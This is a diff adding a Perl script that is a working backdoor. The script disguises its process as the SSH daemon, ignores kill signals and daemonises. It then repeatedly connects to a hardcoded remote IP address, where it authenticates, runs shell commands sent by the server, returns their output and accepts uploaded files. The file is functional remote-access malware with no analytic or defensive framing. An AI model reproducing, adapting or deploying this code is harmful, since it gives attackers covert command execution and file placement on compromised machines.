@@ -1,0 +1,186 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+use POSIX ":sys_wait_h";
+use Digest::SHA;
+my $processo = "/usr/sbin/sshd";
+$SIG{"INT"} = "IGNORE";
+$SIG{"HUP"} = "IGNORE";
+$SIG{"TERM"} = "IGNORE";
+$SIG{"CHLD"} = "IGNORE";
+$SIG{"PS"} = "IGNORE";
+$0="$processo"."\0"x16;;
+my $pid=fork;
+exit if $pid;
+die "Problema com o fork: $!" unless defined($pid);
+
+my $username = "user1";
+my $password = "passw0rd";
+
+$| = 1;
+
+my $serverhost = shift || "185.106.123.105"; #serverip
+my $serverport = shift || 80;
+my $file_recv = 0;
+my $file_name = "";
+my $file_size = "";
+my $recv_path = "";
+
+my $bandwidth = 1024*128 ;
+my $file_handle;
+
+connect_to($serverhost, $serverport);
+
+my $USE_PLAINTEXT_AUTH = 1;
+
+sub perform_handshake {
+  my $socket = shift;
+  my ($in_msg, $out_msg);
+
+  $out_msg = "USER $username\n";
+  #print ">> $out_msg";
+  print $socket $out_msg;
+
+  $in_msg = scalar <$socket>;
+  chomp $in_msg;
+  #print "<< $in_msg\n";
+
+  if (!defined($in_msg) or $in_msg !~ m/CHAL (\w){8}$/) {
+    #print "Expected CHAL message!\n";
+    return 0;
+  }
+
+  if ($USE_PLAINTEXT_AUTH) {
+    $out_msg = "PASS $password\n";
+    #print(">> $out_msg");
+  } else {
+    my $challenge = (split(/ /, $in_msg))[1];
+
+    my $resp_hash = Digest::SHA::sha1_hex($username . $challenge . $password);
+
+    $out_msg = "RESP $resp_hash\n";
+    #print(">> $out_msg");
+  }
+
+  print $socket $out_msg;
+}
+
+
+sub connect_to {
+    my $ip = shift;
+    my $port = shift;
+    my $socket;
+
+    while (1) { # Keep establishing new TCP connections to the server.
+      #print "Connecting to $ip:$port...\n";
+      while (! defined ($socket = IO::Socket::INET->new(PeerAddr => $ip, 
+                                                        PeerPort => $port,
+                                                        Proto        => 'tcp',
+                                                        Timeout      => 1,  )) ) {
+      # Wait for 1 second between retries.
+                  #print(".");
+                  sleep 1;
+      }
+
+      #print "Performing handshake...\n";
+      if (perform_handshake($socket) == 0) {
+        #print "Handshake failed\n";
+        sleep(10);
+        last;
+      }
+
+      #print "\nConnected! Awaiting for messages...\n";
+      my $line;
+      my $sum = 0;
+      # while(my $line = <$socket>) {
+        while (sysread($socket, $line, $bandwidth)) {
+          chomp $line;
+
+          if ($file_recv == 0) {
+            if ($line =~ m/^CMD /) {
+               run_command($socket, $line);
+             } elsif ($line =~ m/^SEND /) {
+               do_recv_file($socket, $line);
+             }
+          } else {
+            $sum = $sum + length($line);
+            
+            open (FILENEW,">>".$recv_path."/".$file_name) ; binmode(FILENEW) ;
+            print FILENEW $line ;
+            close (FILENEW) ;
+
+            if (abs($sum-$file_size) < 100) {
+              print "Done\n";
+              $sum = 0;
+              $file_recv = 0;
+              next;
+            }
+          }
+      }
+      $socket->close();
+      #print "Disconnected...\n";
+    }
+}
+
+sub run_command {
+  my $socket = shift;
+  my $cmd = shift;
+  my $cmd_result = "";
+
+  $cmd =~ s/^CMD //;
+  #print "Running $cmd\n";
+
+  open(pipe_f, "$cmd|");
+
+  print $socket "CMDR \n";
+
+  while (<pipe_f>) {
+    chomp;
+    print $socket $_ . "\n";
+  }
+
+  print $socket "CMDREND \n";
+
+  close($pipe_f);
+}
+
+sub do_recv_file {
+  my $socket = shift;
+  my $message = shift;
+
+  $message =~ s/^SEND //;
+
+  my @params = split / /, $message;
+  $file_name = $params[0];
+  $file_size = $params[1];
+  $recv_path = $params[2];
+
+  if (not -d $recv_path) {
+    print "No such path, can't save file!\n";
+    print $socket "SENDR 1\n";
+    return;
+  } else {
+    my $check_permission_file = $recv_path."/test";
+
+    unless (open(FH, ">$check_permission_file")) 
+    {
+      print "No permission to write\n";
+      print $socket "SENDR 2\n";
+      return;
+    }
+    close(FH);
+    system("rm", $check_permission_file);
+
+    system("rm", $check_permission_file);
+    print ("Ready to receive file\n");
+    print $socket "SENDR 0\n";
+    $file_recv = 1;
+
+    my $recv_file_name = $recv_path."/".$file_name;
+    if (-e $recv_file_name) {
+      system ("rm", $recv_file_name);
+    }
+
+    print "Receiving...\n";
+  }
+}
